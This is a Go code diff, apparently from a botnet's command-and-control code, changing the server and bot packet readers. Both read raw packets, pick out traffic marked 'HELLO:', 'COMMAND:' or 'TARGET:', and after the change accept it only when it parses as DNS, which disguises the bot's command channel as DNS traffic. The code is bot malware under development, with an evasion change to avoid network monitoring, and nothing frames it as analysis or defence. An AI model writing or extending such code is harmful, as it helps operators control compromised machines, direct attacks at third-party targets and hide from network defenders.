@@ -90,9 +90,11 @@ func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
-			return packet
+		if dns := packet.Layer(layers.LayerTypeDNS); dns != nil {
+			// Make sure this is my packet
+			if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
+				return packet
+			}
 		}
 		return nil
 	}
@@ -132,12 +134,13 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	// Parse packet... hopefully
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
-		fmt.Println(packet.Layer(layers.LayerTypeUDP).LayerType().String())
-		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
-			return packet, false
-		} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
-			return packet, true
+		if dns := packet.Layer(layers.LayerTypeDNS); dns != nil {
+			// Make sure this is my packet
+			if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
+				return packet, false
+			} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
+				return packet, true
+			}
 		}
 		return nil, false
 	}
